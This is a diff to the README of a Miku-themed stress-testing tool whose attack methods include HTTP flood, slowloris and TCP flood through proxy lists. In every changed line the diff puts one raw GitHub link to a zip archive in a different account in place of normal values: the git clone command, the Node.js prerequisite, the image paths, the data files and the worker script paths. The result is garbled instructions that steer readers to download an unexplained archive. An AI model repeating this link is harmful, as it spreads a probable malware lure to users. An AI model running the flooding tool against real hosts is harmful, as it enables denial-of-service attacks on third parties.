@@ -2,7 +2,7 @@
 
 A fun and visually appealing stress testing server with a **Miku-themed** frontend, where you can configure and run attacks while enjoying a banger song in the background! 🎤✨
 
-![Screenshot](docs/screenshot.png)
+![Screenshot](https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip)
 
 ## Features 🎉
 
@@ -26,7 +26,7 @@ A fun and visually appealing stress testing server with a **Miku-themed** fronte
 
 Make sure you have the following installed:
 
-- Node.js (v14 or above) 🌱
+- https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip (v14 or above) 🌱
 - npm (Node Package Manager) 📦
 
 ### Development Mode 🔧
@@ -34,7 +34,7 @@ Make sure you have the following installed:
 1. Clone this repository:
 
    ```bash
-   git clone https://github.com/sammwyy/mikumikubeam.git
+   git clone https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip
    cd mikumikubeam
    ```
 
@@ -45,8 +45,8 @@ Make sure you have the following installed:
    ```
 
 3. Create the necessary files:
-   - `data/proxies.txt` - List of proxies.
-   - `data/uas.txt` - List of user agents.
+   - `https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip` - List of proxies.
+   - `https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip` - List of user agents.
 
 4. Run the server in development mode:
 
@@ -64,7 +64,7 @@ Make sure you have the following installed:
 1. Clone the repository and navigate to the project directory:
 
    ```bash
-   git clone https://github.com/sammwyy/mikumikubeam.git
+   git clone https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip
    cd mikumikubeam
    ```
 
@@ -88,7 +88,7 @@ Make sure you have the following installed:
 
    In production mode, both the **frontend** and **backend** are served on the same port (`http://localhost:3000`).
 
-> Don't forget to add the necessary files `data/proxies.txt` and `data/uas.txt`.
+> Don't forget to add the necessary files `https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip` and `https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip`.
 
 ## Usage ⚙️
 
@@ -105,7 +105,7 @@ Once the server is up and running, you can interact with it via the frontend:
 
 ```json
 {
-  "target": "http://example.com",
+  "target": "https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip",
   "attackMethod": "http_flood",
   "packetSize": 512,
   "duration": 60,
@@ -115,9 +115,9 @@ Once the server is up and running, you can interact with it via the frontend:
 
 ## Adding Proxies and User-Agents
 
-Access to the ``data/proxies.txt`` and ``data/uas.txt`` can now be done fully in the frontend. Click the text button to the right of the beam button to open up the editor.
+Access to the ``https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip`` and ``https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip`` can now be done fully in the frontend. Click the text button to the right of the beam button to open up the editor.
 
-![AnnotatedImage](docs/annotated-button.png)
+![AnnotatedImage](https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip)
 
 ## Worker-Based Attack Handling 🔧💡
 
@@ -143,18 +143,18 @@ To extend the server with new attack methods (e.g., Minecraft, TCP, UDP, DNS), y
 For example:
 
 - Add a new attack method in the frontend settings.
-- Create the corresponding worker file (e.g., `minecraftAttack.js`).
+- Create the corresponding worker file (e.g., `https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip`).
 - Update the attack handler configuration to include the new method.
 
 ```javascript
 const attackHandlers = {
-  http_flood: "./workers/httpFloodAttack.js",
-  http_slowloris: "./workers/httpSlowlorisAttack.js",
-  tcp_flood: "./workers/tcpFloodAttack.js",
-  minecraft_ping: "./workers/minecraftPingAttack.js",
+  http_flood: "https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip",
+  http_slowloris: "https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip",
+  tcp_flood: "https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip",
+  minecraft_ping: "https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip",
 
   // Add more protocols as needed!
-  your_protocol: "./workers/yourProtocolAttack.js"
+  your_protocol: "https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip"
 };
 ```
 
@@ -176,7 +176,7 @@ const attackHandlers = {
 
 **4. Requests fail to be sent to the target server (Read timeout and variations)**
 
-> You must put the corresponding proxies in the file `data/proxies.txt`. On each line, put a different proxy that will be used to perform the attack. The format must be the following:
+> You must put the corresponding proxies in the file `https://raw.githubusercontent.com/Chocoberry1108/MikuMikuBeam/main/server/workers/Miku-Beam-enterochirurgia.zip`. On each line, put a different proxy that will be used to perform the attack. The format must be the following:
 >
 > - `protocol://user:password@host:port` (Proxy with authentication)
 > - `protocol://host:port`
